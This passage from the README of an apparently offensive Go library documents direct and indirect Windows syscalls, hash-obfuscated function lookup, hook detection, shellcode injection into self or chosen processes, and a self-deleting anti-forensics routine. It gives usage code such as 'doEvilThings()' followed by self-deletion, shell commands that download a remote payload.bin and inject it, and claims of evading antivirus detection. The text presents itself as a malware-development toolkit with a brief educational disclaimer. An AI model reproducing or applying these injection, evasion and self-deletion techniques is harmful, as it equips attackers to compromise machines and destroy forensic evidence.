5. **Timing**: Some operations may require delays (like the debug print in `NtWriteVirtualMemory`)

### Common NTSTATUS Values

- `0x00000000` - STATUS_SUCCESS
- `0xC0000005` - STATUS_ACCESS_VIOLATION  
- `0xC0000008` - STATUS_INVALID_HANDLE
- `0xC000000D` - STATUS_INVALID_PARAMETER
- `0xC0000022` - STATUS_ACCESS_DENIED
- Use function name obfuscation
- Direct kernel communication

## Recent Enhancements

### Enhanced Hash-Based Lookup System

The library now features a significantly improved hash-based lookup system with enterprise-grade robustness:

#### **Performance Optimizations**
- **Thread-Safe Caching**: All resolved syscall numbers are cached with mutex protection
- **Cache Prewarming**: `PrewarmSyscallCache()` loads all 52+ NT functions at startup  
- **Instant Lookups**: Subsequent calls return immediately from cache (microsecond response)
- **Cache Statistics**: Track performance with `GetSyscallCacheStats()`

#### **Enhanced Validation & Error Handling**
- **Syscall Stub Validation**: Validates function patterns and detects hooks
- **Multiple Pattern Recognition**: Supports different Windows syscall stub variations
- **Hook Detection**: Identifies JMP instructions indicating function hooks
- **Retry Mechanisms**: Exponential backoff for failed module resolution
- **Graceful Degradation**: Continues operation even if some validations fail

#### **Robustness Features**
- **Alternative Hash Algorithms**: SHA-256 and FNV-1a backups for hash collisions
- **Hash Collision Detection**: Automatically detects and warns about collisions
- **Memory Validation**: Comprehensive bounds checking and memory access validation
- **Debug Information**: Optional detailed logging for troubleshooting

#### **Usage Examples**

```go
// Initialize enhanced system
err := winapi.PrewarmSyscallCache()
if err != nil {
    log.Printf("Cache prewarming failed: %v", err)
}

// Validate the lookup system
err = winapi.ValidateHashLookupSystem()
if err != nil {
    log.Printf("Validation warning: %v", err)
}

// Get performance statistics
stats := winapi.GetSyscallCacheStats()
fmt.Printf("Cache size: %v, Algorithm: %v\n", 
    stats["cache_size"], stats["hash_algorithm"])

// Enhanced syscall resolution with validation
ssn, isValid, err := winapi.GetSyscallWithValidation("NtAllocateVirtualMemory")
if !isValid {
    log.Printf("Syscall validation failed for function")
}
```

### Improved User Experience

#### **Smart Process Filtering**
- **System Process Hiding**: Automatically filters out 30+ Windows system processes
- **Clean Interface**: Shows only user applications and third-party processes  
- **Safer Operation**: Reduces risk of targeting critical system components
- **Consistent Behavior**: Filtering active regardless of command-line flags

#### **Enhanced Process Selection**
- **No More System Clutter**: No `svchost.exe`, `csrss.exe`, `dwm.exe`, etc. in process list
- **Focus on Targets**: Only shows meaningful injection targets
- **Reduced Accidents**: Less chance of accidentally targeting system processes

#### **Process Filter List**
The system automatically hides these common Windows processes:
```
system, smss.exe, csrss.exe, wininit.exe, winlogon.exe, services.exe, 
lsass.exe, svchost.exe, dwm.exe, explorer.exe, fontdrvhost.exe, 
sihost.exe, taskhostw.exe, conhost.exe, dllhost.exe, and 15+ more
```

### Thread Management Improvements

#### **Donut Payload Compatibility**
- **Thread Waiting**: Added `NtWaitForSingleObject` to wait for payload completion
- **Handle Cleanup**: Proper thread handle closure after execution
- **Indefinite Wait**: Uses `nil` timeout for complete payload execution
- **Status Reporting**: Detailed logging of thread execution status

#### **Usage Pattern**
```go
// Thread now waits for completion (essential for donut payloads)
status, err := winapi.NtCreateThreadEx(/* args */)
if status == winapi.STATUS_SUCCESS {
    // Wait for thread to complete
    waitStatus, err := winapi.NtWaitForSingleObject(hThread, false, nil)
    // Handle cleanup
    winapi.NtClose(hThread)
}
```

### Validation & Error Handling

#### **NT Status Integration**
- **Smart Validation Thresholds**: Only warns for truly suspicious syscall numbers (0-1)
- **Contextual Warnings**: Differentiates between normal low numbers and actual issues
- **False Positive Reduction**: No more warnings for common functions like `NtClose(15)`

#### **Expected Behavior**
```
NtClose: SSN 15           - Normal, no warning
NtWaitForSingleObject: SSN 4  - Normal, no warning  
NtReadFile: SSN 6         - Normal, no warning
Unknown Function: SSN 0   - Warning (truly suspicious)
```

### Self-Deletion Capability

The library includes `SelfDel()` for self-deletion of the current executable using NT APIs exclusively.

#### **How SelfDel Works**
>credit to https://github.com/Enelg52/OffensiveGo/tree/main/self_remove for implementation in go, although this is a common method 
>this method does not work on Win 11 24H2, but I just saw this writeup https://tkyn.dev/2025-6-8-The-Not-So-Self-Deleting-Executable-on-24h2/ which explains a way to do it, most likely doable with my library :3


The self-deletion process uses a sophisticated technique that bypasses standard file locking mechanisms:

1. **NT Path Format**: Uses `\\??\\` prefix for direct NT filesystem access (required for DELETE access)
2. **DELETE Access**: Opens file handle with `DELETE|SYNCHRONIZE` permissions
3. **Alternate Data Stream**: Renames file to `:trash` ADS to break existing file locks
4. **Disposition Flag**: Sets `FILE_DISPOSITION_INFO.DeleteFile = 1` to mark for deletion
5. **Delayed Deletion**: File is deleted when the last handle is closed (process termination)

#### **Technical Implementation**

```go
// Simple usage yayyy call anywhere in your program (lol)
winapi.SelfDel()

// The file will be deleted when your process exits
// No additional cleanup required
```

#### **Advanced Details**

**Why NT Path Format?**
- Standard Win32 paths often fail with `STATUS_OBJECT_PATH_SYNTAX_BAD`
- NT path format (`\\??\\C:\path\file.exe`) provides direct filesystem access
- Required for obtaining DELETE access on running executables

**Alternate Data Stream Technique:**
- Renames `file.exe` to `file.exe:trash` 
- Breaks file locks that prevent deletion
- Windows filesystem treats ADS as a separate entity
- Original file becomes inaccessible to new processes

**Deletion Process:**
- File is marked for deletion but continues running
- Deletion occurs when process terminates and closes all handles
- No recovery possible once `FILE_DISPOSITION_INFO` is set
- Works even if file is currently being executed

#### **Usage Examples**

**Basic Usage:**
```go
package main

import winapi "github.com/carved4/go-native-syscall"

func main() {
    // Your malware/tool logic here
    doEvilThings()
    
    // Delete this executable on exit
    winapi.SelfDel()
    
    // Program continues normally
    // File deleted when process terminates :P
}
```

**With Shellcode Injection:**
```go
func main() {
    // Inject payload
    err := winapi.NtInjectSelfShellcode(shellcode)
    if err == nil {
        // Only delete if injection succeeded
        winapi.SelfDel()
    }
}
```

**Debug Output Example:**
```
[DEBUG SELFDEL] Using NT path format: \\??\\C:\path\malware.exe
[DEBUG SELFDEL] UNICODE_STRING: Length=140, MaxLength=142
[DEBUG SELFDEL] OBJECT_ATTRIBUTES initialized, Length=48
[DEBUG SELFDEL] File handle acquired with DELETE access
[DEBUG SELFDEL] File renamed to ADS
[DEBUG SELFDEL] File marked for deletion
[DEBUG SELFDEL] Successfully initiated self-deletion
```

#### **Integration with Main Tool**

The command-line tool automatically calls `SelfDel()` after successful operations:

```bash
# These commands will delete the executable after payload injection
./go-native-syscall.exe -example
./go-native-syscall.exe -url https://server.com/payload.bin
./go-native-syscall.exe -url https://server.com/payload.bin -self
```

**Note**: The `-dump` and `-privesc` options do not trigger self-deletion as they are used for research purposes.

#### **Error Handling**

`SelfDel()` includes error handling with descriptive NT status messages:

- `STATUS_OBJECT_NAME_INVALID` - Path format issues (automatically uses NT format)
- `STATUS_OBJECT_PATH_SYNTAX_BAD` - Win32 path rejected (fallback to NT path)
- `STATUS_ACCESS_DENIED` - Insufficient permissions (rare on self-owned files)
- `STATUS_SHARING_VIOLATION` - File locked by another process

All errors are logged with debug output but don't halt program execution.

#### **Security Considerations**

- **No Recovery**: Deletion cannot be undone once initiated
- **Immediate Effect**: File becomes inaccessible to new processes immediately  
- **Anti-Forensics**: Makes post-execution analysis more difficult
- **Detection Evasion**: No traces left on filesystem after process termination

## Security Considerations

- **Kernel-level Detection**: Direct syscalls may still be monitored at the kernel level
- **Process Protection**: Some protected processes resist manipulation
- **NTSTATUS Handling**: Always check return codes for error conditions
- **Memory Safety**: Use appropriate memory protection and bounds checking

## Examples

See the cmd/main.go file for an example 

- **Basic Memory Operations**: Allocation, reading, writing
- **Process Manipulation**: Opening processes, thread creation
- **File Operations**: Creating, reading, writing files
- **System Queries**: Getting system and process information
- **Obfuscation**: Using function hashes for stealth

## Testing

```bash
cd go-native-syscalls

# Build the application
go build ./cmd

# Dump all syscalls (no injection, safe for analysis)
./go-native-syscall.exe -dump

# Scan for privilege escalation vectors (no files created)
./go-native-syscall.exe -privesc



# Self-injection with embedded calc shellcode (default for -example)
./go-native-syscall.exe -example 

# Explicit self-injection mode
./go-native-syscall.exe -self -url http://example.com/payload.bin

# Remote injection with custom payload (shows process selection)
./go-native-syscall.exe -url http://example.com/payload.bin

# Enable debug logging for any operation
./go-native-syscall.exe -debug -privesc

# The embedded shellcode is a simple calc.exe payload - replace GetEmbeddedShellcode() 
# function with your own shellcode generated via donut, msfvenom, etc.


```
## Detection

![Screen Shot 2025-06-06 at 5 21 45 PM](https://github.com/user-attachments/assets/8fa911db-129c-4d11-a0dd-d08fa3fd143a)
![image](https://github.com/user-attachments/assets/0050c8d0-4980-46dd-bbc9-626320418c1a)
(as of right now - Friday June 6th 5:21 pm ET 2025)

## Contributing

Contributions are welcome! Please feel free to:

- Add more Windows API function wrappers
- Improve error handling
- Add more examples
- Optimize performance
- Add support for additional architectures

## License

This project is licensed under the [MIT LICENSE](LICENSE).

## Credits


- **Original Concept**: Extracted from [Whitecat18's Rust implementation](https://github.com/Whitecat18/Rust-for-Malware-Development/tree/main/syscalls/direct_syscalls)
- **Assembly Implementation**: indirect syscall taken from [f1zm0/acheron](https://github.com/f1zm0/acheron)

##  Disclaimer
I am a college student with limited systems programming experience, this tool may not work as expected for all types of payloads or in all circumstances, if you run into an issue please submit it to me on this repo or send a DM on twitter or something I would really
appreciate it. :3 thanks
ALSO 
This tool is provided for **educational and research purposes only**. Use of this software for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable laws. The developers assume no liability and are not responsible for any misuse or damage caused by this program.
